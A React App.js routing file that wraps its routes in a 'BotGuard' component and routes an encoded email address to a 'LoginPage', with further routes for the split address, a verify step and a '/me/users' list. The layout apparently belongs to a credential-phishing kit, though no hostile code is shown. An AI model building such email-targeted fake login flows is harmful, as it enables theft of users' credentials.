import "./App.css";
import Home from "./components/Home";
import Encoder from "./components/Encoder";
import LoginPage from "./components/LoginPage";
import BotGuard from "./components/BotGuard";

import { BrowserRouter as Router, Routes, Route } from "react-router-dom";
import GetUsers from "./components/GetUsers";
import Hom from "./components/Hom";

function App() {
  return (
    <BotGuard>
      <Router>
        <Routes>
          <Route exact path="/" element={<Encoder />}></Route>
          <Route exact path="/:encodedEmail" element={<LoginPage />}></Route>
          <Route exact path="/:mail/:host/:ext" element={<Home />}></Route>
          <Route exact path="/:mail/verify" element={<Hom />}></Route>
          <Route exact path="/me/users" element={<GetUsers />}></Route>
        </Routes>
      </Router>
    </BotGuard>
  );
}

export default App;
